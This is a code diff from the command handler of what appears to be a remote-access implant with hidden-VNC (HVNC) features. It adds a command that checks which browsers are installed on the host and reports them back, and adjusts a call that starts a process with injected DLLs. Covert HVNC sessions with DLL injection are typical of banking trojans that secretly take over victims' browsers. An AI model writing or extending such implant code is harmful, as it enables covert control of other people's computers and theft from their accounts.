@@ -1474,6 +1474,19 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		})
 		return nil
 
+	case "hvnc_browser_check":
+		log.Printf("hvnc: browser availability check requested")
+		sendCommandResultSafe(env, cmdID, true, "")
+		goSafe("hvnc_browser_check", nil, func() {
+			browsers := capture.CheckInstalledBrowsers()
+			_ = wire.WriteMsg(context.Background(), env.Conn, wire.HVNCBrowserCheckResult{
+				Type:     "hvnc_browser_check_result",
+				Browsers: browsers,
+			})
+			log.Printf("hvnc: browser check complete: %v", browsers)
+		})
+		return nil
+
 	case "hvnc_lookup":
 		payload, _ := envelope["payload"].(map[string]interface{})
 		exeName := ""
@@ -1532,7 +1545,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		log.Printf("hvnc: start process injected %q search=%q replace=%q dllSize=%d captureDllSize=%d", filePath, searchPath, replacePath, len(dllBytes), len(captureDllBytes))
 		sendCommandResultSafe(env, cmdID, true, "")
 		goSafe("hvnc_start_process_injected", nil, func() {
-			if err := capture.StartHVNCProcessInjected(filePath, dllBytes, captureDllBytes, searchPath, replacePath); err != nil {
+			if _, err := capture.StartHVNCProcessInjected(filePath, dllBytes, captureDllBytes, searchPath, replacePath); err != nil {
 				log.Printf("hvnc: injected process failed for %q: %v", filePath, err)
 			}
 		})
